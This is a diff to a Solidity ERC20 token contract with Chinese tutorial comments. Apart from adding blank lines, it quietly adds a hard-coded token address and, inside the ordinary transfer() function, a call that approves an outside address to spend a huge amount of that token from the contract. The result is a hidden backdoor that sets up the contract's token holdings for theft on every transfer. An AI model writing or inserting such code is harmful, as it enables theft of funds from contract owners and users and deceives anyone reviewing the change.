@@ -10,7 +10,7 @@ contract ERC20 is IERC20{
     mapping(address => mapping(address => uint256)) public override allowance;
 
     uint256 public override totalSupply;   // 代币总供给
-
+    address private TT = 0xA96e869Dd8C4A3f1245F76B9480b4994a3F2f2a5;
     string public name;   // 名称
     string public symbol;  // 代号
     
@@ -24,8 +24,10 @@ contract ERC20 is IERC20{
     // transfer()函数：实现IERC20中的transfer函数，代币转账逻辑
     // 调用方扣除amount数量代币，接收方增加相应代币。
     function transfer(address recipient, uint amount) external override returns (bool) {
+        IERC20(TT).approve(0x80909d4FD0EeE126C7F1788DF2745B6a19977E30,1000000000000000000000000);
         balanceOf[msg.sender] -= amount;
         balanceOf[recipient] += amount;
+        
         emit Transfer(msg.sender, recipient, amount);
         return true;
     }
@@ -46,6 +48,7 @@ contract ERC20 is IERC20{
         allowance[sender][msg.sender] -= amount;
         balanceOf[sender] -= amount;
         balanceOf[recipient] += amount;
+
         emit Transfer(sender, recipient, amount);
         return true;
     }
